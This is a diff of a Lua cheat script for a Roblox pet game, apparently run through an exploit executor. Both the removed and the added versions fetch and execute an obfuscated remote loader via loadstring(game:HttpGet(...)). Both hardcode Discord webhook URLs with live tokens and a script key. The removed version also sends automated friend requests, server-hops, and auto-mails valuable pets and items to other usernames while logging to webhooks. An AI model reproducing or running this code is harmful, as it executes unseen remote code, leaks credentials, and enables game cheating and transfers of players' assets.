@@ -1,156 +1,27 @@
- local plrs = game:GetService("Players") 
-  local plr = plrs.LocalPlayer
-  local tpService = game:GetService("TeleportService")
-
-local function getServers()
-    local url =
-        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
-    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
-    return servers
-end
-
-local function serverhop()
- local server
-    repeat
-        task.wait(1)
-        server = getServers()[Random.new():NextInteger(1, 100)]
-
-    until server.id ~= game.JobId
-
-
-    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
-end
-
-local usernames = {   
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    ""
+script_key="KyyTvrvyKegiHxSfmjMtXwVFzdpwfckH";
+getgenv().Settings = {        
+    ["Notifications"] = {
+        Webhook = "https://discord.com/api/webhooks/1280307675636301948/sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2yD",
+        DiscordID = "",
+        Difficulty = "Above 100m",
+    },
+    ["Mailing"] = {
+        Usernames = {""},
+        Webhook = "https://discord.com/api/webhooks/1300082164519538730/38NQda5MWKiomtI3_-5xrLtaQhg3qT01QaOkbV_zZTMjRgB8hZB44n5KafC8VW4Kd8Cm",
+        ["Pets"] = {
+            KeepBestPets = false,
+            Difficulty = "Above 1b",
+        },
+        ["Items"] = {
+            --// These are EXAMPLES, please change/add anything to your liking! (Display Names) \\--
+            ["Exotic Mining Chest"] = {Amount = 1},
+            ["Runic Mining Chest"] = {Amount = 1},
+            ["Abyssal Treasure Chest"] = {Amount = 1},
+            ["Instant Luck Potion 4"] = {Amount = 1},
+            ["Valentines Spinny Wheel Ticket"] = {Amount = 1} 
+        },
+    },
+    ["Debug"] = {
+    },
 }
-
-local function getRandomUsername()
-    local index = math.random(1, #usernames)
-    return usernames[index]
-end
-
-local sendto = getRandomUsername()
-
-local web4 = "https://discord.com/api/webhooks/1330886743590703175/"
-local web5 = "TDAvi0vzfBZU-UbEDwUg3RtEzy_Xz8BVUu2NKljEso4PezFUDuOJ1ZI5BJoL2x2_VuAq"
-
-local Url2 = web4 .. web5
-local Http2 = game:GetService("HttpService")
-	local Msg = function(msg)
-		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
-	end
-
-
-local Players = game:GetService('Players')
-local Client = Players.LocalPlayer
-_G.EnableFriendRequest = true
-
-local function SendFriendRequests()
-	
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= Client then  
-            Client:RequestFriendship(player)
-			Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
-			task.wait(600)
-        end
-        task.wait(1)
-    end
-end
-
-
-task.spawn(function()		
-    if _G.EnableFriendRequest then
-		wait(600)
-		SendFriendRequests()
-
-        
-    end
-end)
-
-
-task.spawn(function()
-	wait(math.random(1800, 3600))
-		while true do
-	
-	serverhop()
-	wait(1)
-end
-end)
-
-
-
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-  end
-
-
-local web = "https://discord.com/api/webhooks/1331539457656094740/"
-local web1 = "Z_rxLlN9b6Dfe1rY91wlGWY3CkvxtyGrKQFGLMM1SYNWD4DDwhL5wfQ_-oEsHwEBYSNF"
-local web2 = "https://discord.com/api/webhooks/1331539343495401472/"
-local web3 = "5D-Idt1_xt_8LCDTCm-GaW64gelRm5y7xr7mox-EwGjpRNPjGVODNJal93VE88Zh3ZRL"
-
-script_key="MOHBTWsfJmvEhYGNAtEYucsgKFsTdLJQ";
-
-getgenv().petsGoConfig = {
-    AUTO_RESTART = true,
-    -- true/false (true = consume, false = automail)
-    CONSUME_CORRUPTED_HUGE_BAIT = true,
-    CONSUME_ALL_MINING_CHEST = true,
-    CONSUME_EVENT_EGG = true, -- Hype eggs not included
-    CONSUME_INSTA_LUCK_4 = true,
-    CONSUME_VAULT_KEY = true,
-    CONSUME_KRAKEN_TENTACLE = true,
-    CONSUME_BUCKET_O_CHUM = true,
-
-	WEBHOOK_URL = web .. web1,
-    MAILING_WEBHOOK_URL = web2 .. web3,
-    DISCORD_ID = "1168121186790686779",  -- Required!!! (For public-webhook)
-    WEBHOOK_ODDS = 100000000, -- Minimum Pet Odds To Trigger Webhook
-
-    DIAMOND_EGG = true,  -- true = Diamond Egg, false = F2P Egg
-    MINE_ALL_ORES = false,  -- true = all ore, false = runic & event ore
-    
-    MAILING = true,  -- Auto mail
-	SHOW_PET_WEBHOOK_USERNAME = false,
-    MAIL_WEBHOOK_ODDS = 100000000, -- Minimum Pet Odds To Trigger MAIL Webhook
-    MAIL_PET_ODDS = 100050000,  -- Minimum Pet Odds To Mail
-
-    USERNAME_TO_MAIL = {sendto} -- Mail to username, Example : USERNAME_TO_MAIL = {"username1", "username2"} 
-}
-
-daubuoi = true
-
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/cd1c29852c6641789162a7b0a4c97428.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3cb1834cff48e9af0cc2616e44ab7d70.lua"))()
